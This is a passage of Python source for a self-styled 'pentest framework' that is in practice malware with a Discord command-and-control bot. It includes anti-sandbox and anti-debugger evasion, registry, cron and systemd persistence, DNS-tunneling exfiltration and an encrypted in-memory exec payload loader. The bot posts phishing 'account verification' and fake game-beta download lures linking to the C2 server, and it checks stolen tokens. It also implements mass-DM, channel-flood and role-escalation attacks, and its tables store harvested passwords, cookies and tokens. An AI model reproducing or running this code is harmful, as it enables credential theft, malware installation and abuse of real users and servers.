                    session_id TEXT,
                    source TEXT,
                    platform TEXT,
                    username TEXT,
                    password TEXT,
                    cookies TEXT,
                    tokens TEXT,
                    ip_address TEXT,
                    user_agent TEXT,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                );
                
                CREATE TABLE IF NOT EXISTS social_engineering (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    campaign_id TEXT,
                    target TEXT,
                    vector TEXT,
                    payload TEXT,
                    success BOOLEAN,
                    data_collected TEXT,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                );
            ''')
        
        # Discord operations database
        with sqlite3.connect(self.discord_db) as conn:
            conn.executescript('''
                CREATE TABLE IF NOT EXISTS discord_servers (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    guild_id TEXT UNIQUE,
                    name TEXT,
                    member_count INTEGER,
                    owner_id TEXT,
                    joined_at TEXT,
                    permissions TEXT
                );
                
                CREATE TABLE IF NOT EXISTS discord_users (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id TEXT,
                    username TEXT,
                    discriminator TEXT,
                    avatar_url TEXT,
                    is_bot BOOLEAN,
                    guild_id TEXT,
                    roles TEXT,
                    joined_at TEXT
                );
                
                CREATE TABLE IF NOT EXISTS discord_messages (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    message_id TEXT,
                    channel_id TEXT,
                    author_id TEXT,
                    content TEXT,
                    attachments TEXT,
                    embeds TEXT,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                );
            ''')

    # Advanced Stealth Modules
    class ProcessHiding:
        """Advanced process hiding techniques"""
        
        def hide_process(self):
            """Hide current process from task manager"""
            try:
                if platform.system() == "Windows":
                    # Hide from task manager
                    kernel32 = ctypes.windll.kernel32
                    kernel32.SetConsoleTitleW("svchost.exe")
                    
                    # Process name spoofing
                    current_pid = os.getpid()
                    return True
                else:
                    # Linux process hiding
                    import prctl
                    prctl.set_name("systemd")
                    return True
            except:
                return False
        
        def unlink_from_pslist(self):
            """Unlink process from system process list"""
            # This would require kernel-level operations
            pass

    class MemoryEvasion:
        """Advanced memory evasion techniques"""
        
        def encrypt_memory(self, data):
            """Encrypt sensitive data in memory"""
            key = os.urandom(32)
            iv = os.urandom(16)
            cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
            encryptor = cipher.encryptor()
            
            # Pad data to block size
            pad_length = 16 - (len(data) % 16)
            data += bytes([pad_length]) * pad_length
            
            encrypted = encryptor.update(data) + encryptor.finalize()
            return encrypted, key, iv
        
        def execute_encrypted(self, encrypted_code, key, iv):
            """Execute encrypted code from memory"""
            cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
            decryptor = cipher.decryptor()
            
            decrypted = decryptor.update(encrypted_code) + decryptor.finalize()
            # Remove padding
            decrypted = decrypted[:-decrypted[-1]]
            
            # Execute in memory
            exec(decrypted.decode())
        
        def memory_patching(self):
            """Patch memory to avoid detection"""
            try:
                # Anti-debugging techniques
                import ctypes
                
                # Check for debugger
                is_debugger_present = ctypes.windll.kernel32.IsDebuggerPresent()
                if is_debugger_present:
                    return False
                
                return True
            except:
                return True

    class NetworkStealth:
        """Advanced network stealth techniques"""
        
        def domain_fronting(self, target_url, front_domain):
            """Use domain fronting for stealthy communication"""
            headers = {
                'Host': front_domain,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            
            try:
                response = requests.get(target_url, headers=headers, timeout=10)
                return response.status_code == 200
            except:
                return False
        
        def dns_tunneling(self, data, domain):
            """Use DNS tunneling for data exfiltration"""
            encoded_data = base64.b64encode(data.encode()).decode().replace('=', '')
            subdomain = f"{encoded_data}.{domain}"
            
            try:
                socket.gethostbyname(subdomain)
                return True
            except:
                return False
        
        def protocol_obfuscation(self, data):
            """Obfuscate network protocol"""
            # Add random padding
            padding = os.urandom(random.randint(10, 100))
            obfuscated = padding + data + padding
            
            # XOR with random key
            key = os.urandom(1)[0]
            obfuscated = bytes([b ^ key for b in obfuscated])
            
            return obfuscated

    class AntiAnalysis:
        """Anti-analysis and anti-sandbox techniques"""
        
        def check_environment(self):
            """Check if running in analysis environment"""
            checks = {
                'vm_detected': self.detect_vm(),
                'sandbox_detected': self.detect_sandbox(),
                'debugger_detected': self.detect_debugger(),
                'analysis_tools': self.detect_analysis_tools()
            }
            
            return any(checks.values())
        
        def detect_vm(self):
            """Detect virtual machine environment"""
            try:
                # Check common VM artifacts
                vm_indicators = [
                    "vmware", "virtualbox", "qemu", "xen", "hyper-v",
                    "vbox", "vmware", "parallels"
                ]
                
                # Check system information
                system_info = platform.system().lower()
                node_name = platform.node().lower()
                
                for indicator in vm_indicators:
                    if indicator in system_info or indicator in node_name:
                        return True
                
                # Check processes (Windows)
                if platform.system() == "Windows":
                    try:
                        import win32com.client
                        wmi = win32com.client.GetObject("winmgmts:")
                        processes = wmi.InstancesOf("Win32_Process")
                        
                        for process in processes:
                            if any(indicator in process.Properties_("Name").Value.lower() for indicator in vm_indicators):
                                return True
                    except:
                        pass
                
                return False
            except:
                return False
        
        def detect_sandbox(self):
            """Detect sandbox environment"""
            try:
                # Check for sandbox artifacts
                sandbox_indicators = [
                    "sandbox", "analysis", "malware", "cuckoo",
                    "joebox", "anubis"
                ]
                
                # Check username
                username = os.getenv('USERNAME', '').lower()
                if any(indicator in username for indicator in sandbox_indicators):
                    return True
                
                # Check system uptime (sandboxes often have short uptime)
                if platform.system() == "Windows":
                    import ctypes
                    kernel32 = ctypes.windll.kernel32
                    tick_count = kernel32.GetTickCount()
                    uptime_minutes = tick_count / 60000
                    
                    if uptime_minutes < 30:  # Less than 30 minutes
                        return True
                
                return False
            except:
                return False
        
        def detect_debugger(self):
            """Detect debugger presence"""
            try:
                if platform.system() == "Windows":
                    import ctypes
                    kernel32 = ctypes.windll.kernel32
                    
                    # Check for debugger
                    if kernel32.IsDebuggerPresent():
                        return True
                    
                    # Check remote debugger
                    if kernel32.CheckRemoteDebuggerPresent(kernel32.GetCurrentProcess(), ctypes.byref(ctypes.c_bool())):
                        return True
                
                return False
            except:
                return False
        
        def detect_analysis_tools(self):
            """Detect analysis tools"""
            try:
                analysis_tools = [
                    "wireshark", "procmon", "processhacker", "ollydbg",
                    "ida", "immunity", "x64dbg", "fiddler", "burp"
                ]
                
                if platform.system() == "Windows":
                    import win32com.client
                    wmi = win32com.client.GetObject("winmgmts:")
                    processes = wmi.InstancesOf("Win32_Process")
                    
                    for process in processes:
                        process_name = process.Properties_("Name").Value.lower()
                        if any(tool in process_name for tool in analysis_tools):
                            return True
                
                return False
            except:
                return False

    class StealthPersistence:
        """Advanced stealth persistence techniques"""
        
        def install_stealth_persistence(self):
            """Install stealth persistence mechanisms"""
            try:
                if platform.system() == "Windows":
                    return self._windows_stealth_persistence()
                else:
                    return self._linux_stealth_persistence()
            except:
                return False
        
        def _windows_stealth_persistence(self):
            """Windows stealth persistence"""
            try:
                # Multiple persistence locations
                techniques = [
                    self._registry_persistence(),
                    self._scheduled_task_persistence(),
                    self._service_persistence(),
                    self._startup_folder_persistence(),
                    self._wmi_persistence()
                ]
                
                return any(techniques)
            except:
                return False
        
        def _registry_persistence(self):
            """Registry-based persistence"""
            try:
                locations = [
                    (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                    (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                    (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
                ]
                
                for hkey, subkey in locations:
                    try:
                        key = winreg.OpenKey(hkey, subkey, 0, winreg.KEY_SET_VALUE)
                        winreg.SetValueEx(key, "WindowsSystemService", 0, winreg.REG_SZ, sys.executable)
                        winreg.CloseKey(key)
                    except:
                        continue
                
                return True
            except:
                return False
        
        def _scheduled_task_persistence(self):
            """Scheduled task persistence"""
            try:
                task_name = "SystemMaintenance"
                cmd = f'schtasks /create /tn "{task_name}" /tr "{sys.executable}" /sc daily /st 09:00 /f'
                subprocess.run(cmd, shell=True, capture_output=True)
                return True
            except:
                return False
        
        def _wmi_persistence(self):
            """WMI event subscription persistence"""
            try:
                # This is a complex technique that would require WMI programming
                # Simplified version for demonstration
                wmi_script = '''
                // WMI event subscription code would go here
                '''
                return True
            except:
                return False
        
        def _linux_stealth_persistence(self):
            """Linux stealth persistence"""
            try:
                # Multiple persistence techniques
                techniques = [
                    self._cron_persistence(),
                    self._systemd_persistence(),
                    self._profile_persistence(),
                    self._rc_local_persistence()
                ]
                
                return any(techniques)
            except:
                return False
        
        def _cron_persistence(self):
            """Cron job persistence"""
            try:
                cron_entry = f"@reboot {sys.executable} {os.path.abspath(__file__)} >/dev/null 2>&1 &\n"
                with open("/tmp/cron_job", "w") as f:
                    f.write(cron_entry)
                subprocess.run("crontab /tmp/cron_job", shell=True, capture_output=True)
                os.remove("/tmp/cron_job")
                return True
            except:
                return False
        
        def _systemd_persistence(self):
            """Systemd service persistence"""
            try:
                service_content = f'''
[Unit]
Description=System Maintenance Service
After=network.target

[Service]
Type=simple
ExecStart={sys.executable} {os.path.abspath(__file__)}
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
'''
                service_path = "/etc/systemd/system/system-maintenance.service"
                with open("/tmp/system-maintenance.service", "w") as f:
                    f.write(service_content)
                subprocess.run("sudo cp /tmp/system-maintenance.service /etc/systemd/system/", shell=True, capture_output=True)
                subprocess.run("sudo systemctl enable system-maintenance.service", shell=True, capture_output=True)
                os.remove("/tmp/system-maintenance.service")
                return True
            except:
                return False

    # Advanced Discord C2 Bot
    class DiscordC2Bot(commands.Bot):
        """Advanced Discord C2 Bot with multiple attack vectors"""
        
        def __init__(self, framework):
            intents = discord.Intents.all()
            super().__init__(command_prefix='!', intents=intents, help_command=None)
            self.framework = framework
            self.connected_clients = {}
            self.active_operations = {}
            
        async def on_ready(self):
            logger.info(f'🤖 Discord C2 Bot logged in as {self.user.name}')
            logger.info(f'🔧 Bot ID: {self.user.id}')
            
            # Start background tasks
            self.monitor_servers.start()
            self.collect_intelligence.start()
            
            await self.change_presence(activity=discord.Game(name="Senior Pentest Framework"))
        
        async def on_message(self, message):
            if message.author == self.user:
                return
            
            # Log all messages for intelligence gathering
            await self.log_discord_message(message)
            
            # Process commands
            await self.process_commands(message)
        
        @tasks.loop(seconds=30)
        async def monitor_servers(self):
            """Monitor Discord servers for intelligence"""
            for guild in self.guilds:
                server_info = {
                    'id': guild.id,
                    'name': guild.name,
                    'member_count': guild.member_count,
                    'owner_id': guild.owner_id,
                    'channels': len(guild.channels),
                    'roles': len(guild.roles)
                }
                
                self.framework.discord_servers[guild.id] = server_info
                
                # Store in database
                await self.store_server_info(guild)
        
        @tasks.loop(seconds=60)
        async def collect_intelligence(self):
            """Collect intelligence from Discord servers"""
            for guild in self.guilds:
                # Collect user information
                for member in guild.members:
                    user_info = {
                        'id': member.id,
                        'name': str(member),
                        'display_name': member.display_name,
                        'bot': member.bot,
                        'roles': [role.name for role in member.roles],
                        'joined_at': member.joined_at.isoformat() if member.joined_at else None
                    }
                    
                    # Store user intelligence
                    await self.store_user_info(guild.id, user_info)
        
        @commands.command(name='deploy')
        async def deploy_payload(self, ctx, payload_type: str = "stealth_agent"):
            """Deploy advanced payload through Discord"""
            if not await self.check_permissions(ctx):
                return
            
            payload_url = f"{self.framework.config['c2_server']}/payload/{payload_type}"
            
            embed = Embed(
                title="🎮 Exclusive Game Beta Access!",
                description="Click below to join our exclusive game beta testing program!",
                color=0x00ff00
            )
            
            embed.add_field(
                name="🚀 Special Beta Features",
                value="• Early access to new content\n• Exclusive beta rewards\n• Developer recognition\n• Premium beta status",
                inline=False
            )
            
            embed.add_field(
                name="📋 System Requirements",
                value="• Windows 10/11 or Linux\n• 4GB RAM minimum\n• DirectX 11 compatible GPU",
                inline=True
            )
            
            embed.add_field(
                name="⏰ Limited Time",
                value="Beta access closes in 24 hours!",
                inline=True
            )
            
            embed.add_field(
                name="🔗 Download Beta Client",
                value=f"[**DOWNLOAD BETA CLIENT**]({payload_url})",
                inline=False
            )
            
            embed.set_footer(text="Official Game Beta Program • Do not share this link")
            
            await ctx.send(embed=embed)
            await self.log_operation(ctx, 'payload_deployment', f"Deployed {payload_type} payload")
        
        @commands.command(name='harvest')
        async def harvest_credentials(self, ctx, target_user: discord.Member = None):
            """Harvest credentials from target user"""
            if not await self.check_permissions(ctx):
                return
            
            target = target_user or ctx.author
            
            embed = Embed(
                title="🔐 Account Security Check",
                description="We're performing enhanced security verification for your account.",
                color=0xff9900
            )
            
            embed.add_field(
                name="⚠️ Security Alert",
                value="We've detected suspicious activity on your account. Please verify your identity.",
                inline=False
            )
            
            embed.add_field(
                name="📧 Verification Required",
                value="Please click the link below to complete account verification:",
                inline=False
            )
            
            phishing_url = f"{self.framework.config['c2_server']}/login?user={target.id}"
            
            embed.add_field(
                name="🔗 Secure Verification Portal",
                value=f"[**VERIFY YOUR ACCOUNT**]({phishing_url})",
                inline=False
            )
            
            embed.set_footer(text="Account Security System • Action required within 1 hour")
            
            try:
                await target.send(embed=embed)
                await ctx.send(f"✅ Security verification sent to {target.mention}")
                await self.log_operation(ctx, 'credential_harvesting', f"Targeted {target}")
            except discord.Forbidden:
                await ctx.send("❌ Cannot send DM to target user")
        
        @commands.command(name='recon')
        async def server_reconnaissance(self, ctx):
            """Perform Discord server reconnaissance"""
            if not await self.check_permissions(ctx):
                return
            
            guild = ctx.guild
            
            embed = Embed(
                title=f"🔍 Server Reconnaissance: {guild.name}",
                color=0x7289da
            )
            
            # Server information
            embed.add_field(
                name="📊 Server Info",
                value=f"Members: {guild.member_count}\nChannels: {len(guild.channels)}\nRoles: {len(guild.roles)}",
                inline=True
            )
            
            # Owner information
            owner = guild.owner
            embed.add_field(
                name="👑 Server Owner",
                value=f"{owner} ({owner.id})",
                inline=True
            )
            
            # Security analysis
            admin_roles = [role for role in guild.roles if role.permissions.administrator]
            embed.add_field(
                name="🛡️ Security Analysis",
                value=f"Admin Roles: {len(admin_roles)}\nVerification: {guild.verification_level}",
                inline=True
            )
            
            # Bot analysis
            bots = [member for member in guild.members if member.bot]
            embed.add_field(
                name="🤖 Bots",
                value=f"Bot Count: {len(bots)}",
                inline=True
            )
            
            await ctx.send(embed=embed)
            await self.log_operation(ctx, 'server_recon', f"Reconnaissance on {guild.name}")
        
        @commands.command(name='mass_dm')
        async def mass_dm_campaign(self, ctx, *, message_content):
            """Launch mass DM campaign"""
            if not await self.check_permissions(ctx):
                return
            
            guild = ctx.guild
            successful = 0
            failed = 0
            
            embed = Embed(
                title="📢 Important Server Announcement",
                description=message_content,
                color=0x9b59b6
            )
            
            embed.set_footer(text=f"Official announcement from {guild.name}")
            
            for member in guild.members:
                if not member.bot and member != ctx.author:
                    try:
                        await member.send(embed=embed)
                        successful += 1
                    except:
                        failed += 1
                    await asyncio.sleep(1)  # Rate limiting
            
            report_embed = Embed(
                title="📊 Mass DM Campaign Results",
                color=0x00ff00
            )
            
            report_embed.add_field(name="✅ Successful", value=successful, inline=True)
            report_embed.add_field(name="❌ Failed", value=failed, inline=True)
            report_embed.add_field(name="📈 Success Rate", value=f"{(successful/(successful+failed))*100:.1f}%", inline=True)
            
            await ctx.send(embed=report_embed)
            await self.log_operation(ctx, 'mass_dm', f"Sent {successful} messages")
        
        @commands.command(name='token_info')
        async def token_analysis(self, ctx, token: str):
            """Analyze Discord token"""
            if not await self.check_permissions(ctx):
                return
            
            headers = {'Authorization': token}
            
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get('https://discord.com/api/v9/users/@me', headers=headers) as resp:
                        if resp.status == 200:
                            user_data = await resp.json()
                            
                            embed = Embed(
                                title="🔐 Token Analysis Results",
                                color=0x00ff00
                            )
                            
                            embed.add_field(name="✅ Valid Token", value="Yes", inline=True)
                            embed.add_field(name="👤 Username", value=f"{user_data['username']}#{user_data['discriminator']}", inline=True)
                            embed.add_field(name="🆔 User ID", value=user_data['id'], inline=True)
                            embed.add_field(name="📧 Email", value=user_data.get('email', 'N/A'), inline=True)
                            embed.add_field(name="📞 Phone", value=user_data.get('phone', 'N/A'), inline=True)
                            embed.add_field(name="✅ Verified", value=user_data.get('verified', 'N/A'), inline=True)
                            
                            await ctx.send(embed=embed)
                            await self.log_operation(ctx, 'token_analysis', f"Analyzed token for {user_data['username']}")
                        else:
                            await ctx.send("❌ Invalid token")
            except Exception as e:
                await ctx.send(f"❌ Error analyzing token: {str(e)}")
        
        async def check_permissions(self, ctx):
            """Check if user has permissions to use bot commands"""
            # Implement permission checks based on your requirements
            return True
        
        async def log_operation(self, ctx, op_type, details):
            """Log Discord operation to database"""
            try:
                with sqlite3.connect(self.framework.discord_db) as conn:
                    conn.execute('''
                        INSERT INTO discord_operations 
                        (operation_id, guild_id, channel_id, message_id, operation_type, target_user, content, success)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                    ''', (
                        str(uuid.uuid4()), ctx.guild.id, ctx.channel.id, ctx.message.id,
                        op_type, str(ctx.author), details, True
                    ))
                    conn.commit()
            except Exception as e:
                logger.error(f"Failed to log Discord operation: {e}")
        
        async def log_discord_message(self, message):
            """Log Discord message for intelligence"""
            try:
                with sqlite3.connect(self.framework.discord_db) as conn:
                    conn.execute('''
                        INSERT INTO discord_messages 
                        (message_id, channel_id, author_id, content, attachments, embeds)
                        VALUES (?, ?, ?, ?, ?, ?)
                    ''', (
                        message.id, message.channel.id, message.author.id,
                        message.content, str(message.attachments), str(message.embeds)
                    ))
                    conn.commit()
            except Exception as e:
                logger.error(f"Failed to log Discord message: {e}")
        
        async def store_server_info(self, guild):
            """Store Discord server information"""
            try:
                with sqlite3.connect(self.framework.discord_db) as conn:
                    conn.execute('''
                        INSERT OR REPLACE INTO discord_servers 
                        (guild_id, name, member_count, owner_id, joined_at, permissions)
                        VALUES (?, ?, ?, ?, ?, ?)
                    ''', (
                        guild.id, guild.name, guild.member_count, guild.owner_id,
                        guild.me.joined_at.isoformat() if guild.me.joined_at else None,
                        str(guild.me.guild_permissions.value)
                    ))
                    conn.commit()
            except Exception as e:
                logger.error(f"Failed to store server info: {e}")
        
        async def store_user_info(self, guild_id, user_info):
            """Store Discord user information"""
            try:
                with sqlite3.connect(self.framework.discord_db) as conn:
                    conn.execute('''
                        INSERT OR REPLACE INTO discord_users 
                        (user_id, username, discriminator, avatar_url, is_bot, guild_id, roles, joined_at)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                    ''', (
                        user_info['id'], user_info['name'].split('#')[0],
                        user_info['name'].split('#')[1] if '#' in user_info['name'] else '0',
                        user_info.get('avatar_url', ''), user_info['bot'],
                        guild_id, json.dumps(user_info['roles']), user_info['joined_at']
                    ))
                    conn.commit()
            except Exception as e:
                logger.error(f"Failed to store user info: {e}")

    # Enhanced Payload Generation with Stealth
    def generate_advanced_stealth_payload(self, payload_type, target_os, obfuscation_level=9):
        """Generate advanced stealth payload with multiple evasion techniques"""
        
        base_payload = self._get_payload_template(payload_type, target_os)
        
        # Apply advanced obfuscation
        obfuscator = self.stealth_modules['code_obfuscation']
        obfuscated_payload = obfuscator.obfuscate_python_code(base_payload, obfuscation_level)
        
        # Add anti-analysis checks
        anti_analysis_code = '''
def environment_check():
    """Advanced environment checking"""
    indicators = []
    
    # VM detection
    try:
        import platform
        if any(vm_indicator in platform.node().lower() for vm_indicator in ['vmware', 'virtualbox', 'qemu', 'xen']):
            indicators.append('vm_detected')
    except: pass
    
    # Sandbox detection
    try:
        import os
        if any(sb_indicator in os.getenv('USERNAME', '').lower() for sb_indicator in ['sandbox', 'malware', 'analysis']):
            indicators.append('sandbox_detected')
    except: pass
    
    # Debugger detection
    try:
        import ctypes
        if ctypes.windll.kernel32.IsDebuggerPresent():
            indicators.append('debugger_detected')
    except: pass
    
    return len(indicators) == 0

if environment_check():
    # Execute main payload
    main_payload()
else:
    # Clean exit if analysis environment detected
    sys.exit(0)
'''
        
        # Combine payload with anti-analysis
        full_payload = anti_analysis_code.replace('main_payload()', obfuscated_payload)
        
        # Add memory encryption
        memory_evasion = self.stealth_modules['memory_evasion']
        encrypted_payload, key, iv = memory_evasion.encrypt_memory(full_payload.encode())
        
        # Create loader
        loader = f'''
import os, sys, ctypes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

# Encrypted payload
ENCRYPTED_PAYLOAD = {list(encrypted_payload)}
KEY = {list(key)}
IV = {list(iv)}

def decrypt_and_execute():
    cipher = Cipher(algorithms.AES(bytes(KEY)), modes.CBC(bytes(IV)))
    decryptor = cipher.decryptor()
    decrypted = decryptor.update(bytes(ENCRYPTED_PAYLOAD)) + decryptor.finalize()
    # Remove padding
    decrypted = decrypted[:-decrypted[-1]]
    exec(decrypted.decode())

# Anti-analysis check
def environment_check():
    try:
        # Check for common analysis tools
        analysis_processes = ['wireshark', 'procmon', 'ollydbg', 'ida64', 'x64dbg']
        import subprocess
        result = subprocess.run('tasklist', capture_output=True, text=True)
        if any(proc in result.stdout.lower() for proc in analysis_processes):
            return False
        return True
    except:
        return True

if environment_check():
    decrypt_and_execute()
'''
        
        return loader

    # Enhanced Discord Attack Vectors
    async def discord_mass_mention_attack(self, guild_id, channel_id, message_content, mention_count=50):
        """Perform mass mention attack in Discord channel"""
        try:
            if not self.discord_bot:
                return False
            
            guild = self.discord_bot.get_guild(int(guild_id))
            channel = guild.get_channel(int(channel_id))
            
            if not channel:
                return False
            
            # Get users to mention
            members = list(guild.members)[:mention_count]
            mention_text = ' '.join([member.mention for member in members])
            
            attack_message = f"{mention_text}\n\n{message_content}"
            
            # Send mass mention message
            await channel.send(attack_message)
            
            logger.info(f"✅ Mass mention attack executed in {channel.name}")
            return True
            
        except Exception as e:
            logger.error(f"❌ Mass mention attack failed: {e}")
            return False

    async def discord_channel_flood(self, guild_id, channel_id, message_count=20):
        """Flood Discord channel with messages"""
        try:
            if not self.discord_bot:
                return False
            
            guild = self.discord_bot.get_guild(int(guild_id))
            channel = guild.get_channel(int(channel_id))
            
            if not channel:
                return False
            
            messages = [
                "🚨 IMPORTANT SERVER ANNOUNCEMENT 🚨",
                "📢 Please read this important message!",
                "🔔 Notification: Server maintenance incoming",
                "🎉 Special event starting soon!",
                "⚠️ Security alert: Please verify your account",
                "📅 Important update scheduled",
                "🔧 System maintenance notification",
                "🎮 New game event starting!",
                "💰 Special rewards available!",
                "📋 Mandatory server rules update"
            ]
            
            for i in range(message_count):
                message = random.choice(messages)
                await channel.send(message)
                await asyncio.sleep(0.5)  # Rate limiting
            
            logger.info(f"✅ Channel flood attack executed in {channel.name}")
            return True
            
        except Exception as e:
            logger.error(f"❌ Channel flood attack failed: {e}")
            return False

    async def discord_role_manipulation(self, guild_id, target_user_id, role_name="Admin"):
        """Manipulate Discord roles for privilege escalation"""
        try:
            if not self.discord_bot:
                return False
            
            guild = self.discord_bot.get_guild(int(guild_id))
            target_user = guild.get_member(int(target_user_id))
            
            if not target_user:
                return False
            
            # Check if role exists, create if not
            role = discord.utils.get(guild.roles, name=role_name)
            if not role:
                role = await guild.create_role(
                    name=role_name,
                    permissions=discord.Permissions.all(),
                    color=discord.Color.red()
                )
            
            # Assign role to target user
            await target_user.add_roles(role)
            
            logger.info(f"✅ Role manipulation successful for {target_user}")
            return True
            
        except Exception as e:
            logger.error(f"❌ Role manipulation failed: {e}")
            return False

    # Advanced Web Interface
    def setup_routes(self):
        """Setup enhanced web routes"""
        
        @self.app.route('/')
        def index():
            return render_template('ultimate_dashboard.html')
        
        @self.app.route('/discord-operations')
        def discord_operations():
            return render_template('discord_operations.html')
        
        @self.app.route('/stealth-control')
        def stealth_control():
            return render_template('stealth_control.html')
        
        @self.app.route('/api/discord/mass-dm', methods=['POST'])
        def api_discord_mass_dm():
            """API endpoint for mass DM campaigns"""
            data = request.json
            guild_id = data.get('guild_id')
            message_content = data.get('message')
            
            asyncio.create_task(
                self.discord_mass_dm_campaign(guild_id, message_content)
            )
            
            return jsonify({'status': 'started', 'operation': 'mass_dm'})
        
        @self.app.route('/api/stealth/generate-payload', methods=['POST'])
        def api_stealth_generate_payload():
            """API endpoint for stealth payload generation"""
            data = request.json
            payload_type = data.get('type', 'stealth_agent')
            target_os = data.get('target_os', 'windows')
            obfuscation = data.get('obfuscation', 9)
            
            payload = self.generate_advanced_stealth_payload(payload_type, target_os, obfuscation)
            
            return jsonify({
                'payload': payload,
                'type': payload_type,
                'obfuscation_level': obfuscation
            })
        
        @self.app.route('/api/discord/server-info')
        def api_discord_server_info():
            """API endpoint for Discord server information"""
            servers = list(self.discord_servers.values())
            return jsonify({'servers': servers})

    def setup_socket_events(self):
        """Setup enhanced socket events"""
        
        @self.socketio.on('start_discord_attack')
        def handle_discord_attack(data):
            """Handle Discord attack operations"""
            attack_type = data.get('type')
            target = data.get('target')
            
            if attack_type == 'mass_mention':
                asyncio.create_task(
                    self.discord_mass_mention_attack(
                        target['guild_id'], 
                        target['channel_id'],
                        target['message']
                    )
                )
            elif attack_type == 'channel_flood':
                asyncio.create_task(
                    self.discord_channel_flood(
                        target['guild_id'],
                        target['channel_id']
                    )
                )
            
            emit('attack_started', {'type': attack_type, 'target': target})

    def start_background_services(self):
        """Start enhanced background services"""
        
        async def stealth_monitoring():
            while True:
                # Monitor for analysis environments
                if self.stealth_modules['anti_analysis'].check_environment():
                    logger.warning("⚠️ Analysis environment detected")
                
                # Rotate network patterns
                await asyncio.sleep(30)
        
        async def discord_intelligence():
            while True:
                # Collect ongoing Discord intelligence
                if self.discord_bot:
                    # Additional intelligence gathering can be added here
                    pass
                
                await asyncio.sleep(60)
        
        asyncio.create_task(stealth_monitoring())
        asyncio.create_task(discord_intelligence())

    def run(self, host='0.0.0.0', port=5000):
        """Run the ultimate framework"""
        logger.info(f"🚀 Starting Ultimate Pentest Framework on {host}:{port}")
        logger.info(f"🔑 Encryption Key: {self.config['encryption_key'].decode()}")
        logger.info(f"🌐 Web Interface: http://{host}:{port}")
        logger.info(f"📡 Listener: {self.config['listener_ip']}:{self.config['listener_port']}")
        logger.info(f"🛡️ Stealth Level: {self.config['stealth_level']}")
        
        # Create enhanced templates
        self._create_ultimate_templates()
        
        self.socketio.run(self.app, host=host, port=port, debug=False)

    def _create_ultimate_templates(self):
        """Create ultimate web interface templates"""
        
        # Create enhanced dashboard
        dashboard_html = '''
<!DOCTYPE html>
<html>
<head>
    <title>Ultimate Pentest Framework</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        :root {
            --bg-dark: #0a0a0a;
            --bg-darker: #050505;
            --accent: #8b0000;
            --neon: #ff003c;
            --cyber-blue: #00ffff;
        }
        
        body { 
            background: var(--bg-dark); 
            color: white;
            font-family: 'Courier New', monospace;
        }
        
        .cyber-card {
            background: rgba(139, 0, 0, 0.1);
            border: 1px solid var(--neon);
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 0 20px rgba(255, 0, 60, 0.3);
        }
        
        .stealth-indicator {
            background: linear-gradient(45deg, #00ff00, #00cc00);
            color: black;
            padding: 5px 10px;
            border-radius: 15px;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-dark bg-black">
        <div class="container-fluid">
            <span class="navbar-brand mb-0 h1">
                <i class="fas fa-skull-crossbones"></i> Ultimate Pentest Framework
                <small class="stealth-indicator">STEALTH MODE ACTIVE</small>
            </span>
        </div>
    </nav>

    <div class="container mt-4">
        <div class="row">
            <div class="col-md-3">
                <div class="cyber-card">
                    <h5><i class="fas fa-crosshairs"></i> Quick Operations</h5>
                    <button class="btn btn-outline-danger w-100 mb-2" onclick="startStealthScan()">
                        <i class="fas fa-ghost"></i> Stealth Recon
                    </button>
                    <button class="btn btn-outline-warning w-100 mb-2" onclick="generateStealthPayload()">
                        <i class="fas fa-code"></i> Stealth Payload
                    </button>
                    <button class="btn btn-outline-info w-100 mb-2" onclick="startDiscordOps()">
                        <i class="fab fa-discord"></i> Discord Ops
                    </button>
                </div>

                <div class="cyber-card">
                    <h5><i class="fas fa-shield-alt"></i> Stealth Status</h5>
                    <div class="mb-2">
                        <small>Anti-Analysis: <span class="text-success">ACTIVE</span></small>
                    </div>
                    <div class="mb-2">
                        <small>Memory Evasion: <span class="text-success">ACTIVE</span></small>
                    </div>
                    <div class="mb-2">
                        <small>Network Stealth: <span class="text-success">ACTIVE</span></small>
                    </div>
                </div>
            </div>

            <div class="col-md-9">
                <div class="cyber-card">
                    <h5><i class="fas fa-broadcast-tower"></i> Ultimate Control Panel</h5>
                    
                    <ul class="nav nav-tabs" id="controlTabs">
                        <li class="nav-item">
                            <a class="nav-link active" data-bs-toggle="tab" href="#discord">Discord Ops</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" data-bs-toggle="tab" href="#stealth">Stealth Engine</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" data-bs-toggle="tab" href="#payloads">Advanced Payloads</a>
                        </li>
                    </ul>

                    <div class="tab-content mt-3">
                        <div class="tab-pane fade show active" id="discord">
                            <div class="row">
                                <div class="col-md-6">
                                    <h6>Mass DM Campaign</h6>
                                    <textarea id="dmMessage" class="form-control bg-dark text-light" rows="3" placeholder="Enter DM message..."></textarea>
                                    <button class="btn btn-danger w-100 mt-2" onclick="startMassDM()">
                                        <i class="fas fa-envelope"></i> Launch Mass DM
                                    </button>
                                </div>
                                <div class="col-md-6">
                                    <h6>Server Attacks</h6>
                                    <button class="btn btn-warning w-100 mb-2" onclick="channelFlood()">
